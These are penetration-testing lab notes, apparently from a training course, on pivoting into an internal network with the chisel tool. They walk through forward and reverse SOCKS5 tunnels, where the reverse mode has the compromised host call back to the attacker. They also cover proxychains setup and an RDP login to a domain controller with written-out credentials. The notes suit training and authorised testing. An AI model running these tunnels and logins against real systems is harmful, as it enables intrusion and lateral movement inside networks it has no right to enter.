-- Fast HTTP tunnel

**Attack host:
```shell-session
git clone https://github.com/jpillora/chisel.git
```
```shell-session
cd chisel
go build
```
```shell-session
scp chisel ubuntu@10.129.202.64:~/
```

**Pivot host:
```shell-session
./chisel server -v -p 1234 --socks5
```

**Attack host:
```shell-session
./chisel client -v 10.129.202.64:1234 socks
```
```shell-session
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf
```

**Pivot to DC
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



### Chisel Reverse Pivot (attack host is server and pivot host is client)

**Attack host:
```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

**Pivot host:
```shell-session
./chisel client -v 10.10.14.17:1234 R:socks
```

**Edit and confirm proxychains.conf on attack host:
```shell-session
tail -f /etc/proxychains.conf 
```
- should have 'socks5 127.0.0.1 1080'

Attack host:
```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

